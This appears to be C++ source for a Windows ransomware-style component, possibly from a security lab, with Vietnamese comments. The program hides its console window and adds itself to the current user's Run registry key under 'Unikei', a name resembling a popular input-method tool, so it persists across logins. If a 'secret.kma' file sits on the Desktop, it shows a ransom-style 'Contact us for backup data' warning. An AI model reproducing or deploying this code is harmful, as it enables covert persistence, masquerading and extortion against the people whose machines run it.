#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <lmcons.h>
#include <cstdlib>

namespace fs = std::filesystem;

void showMessage(const std::string& message) {
    MessageBox(NULL, message.c_str(), "Warning", MB_OK | MB_ICONWARNING);
}

bool filesExist(const std::string &file1)
{
    return fs::exists(file1);
}

std::string getCurrentUsername() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);
    return std::string(username);
}

bool isInStartup(const std::string& appName) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[MAX_PATH];
        DWORD bufferSize = MAX_PATH;
        if (RegQueryValueExA(hKey, appName.c_str(), nullptr, nullptr, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true; // Tồn tại mục đích trong Registry
        }
        RegCloseKey(hKey);
    }
    return false; // Không tồn tại mục đích trong Registry
}

void addToStartup(const std::string& appName, const std::string& appPath) {
    if (!isInStartup(appName)) { // Kiểm tra xem đã tồn tại trong Startup chưa
        HKEY hKey;
        RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
        RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), (appPath.size() + 1) * sizeof(char));
        RegCloseKey(hKey);
    }
}

int main(int argc, char* argv[]) {
    std::string username = getCurrentUsername();
    std::string path = "C:\\Users\\" + username + "\\";
    std::string DesktopPath = path + "Desktop" + "\\";
    std::string filename = "secret.kma";
    
    std::string appName = "Unikei"; // Tên của ứng dụng trong Registry
    std::string appPath = "\"" + fs::absolute(fs::path(argv[0])).string() + "\""; // Đường dẫn tuyệt đối của chương trình

    HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL); //You Can Find HANDLE of other windows too!!!//
	ShowWindow(window, 0);

    // Thêm chương trình vào Registry nếu chưa tồn tại
    addToStartup(appName, appPath);

    if (filesExist(DesktopPath + filename)) {
        showMessage("Contact us for backup data");
    }

    return 0;
}
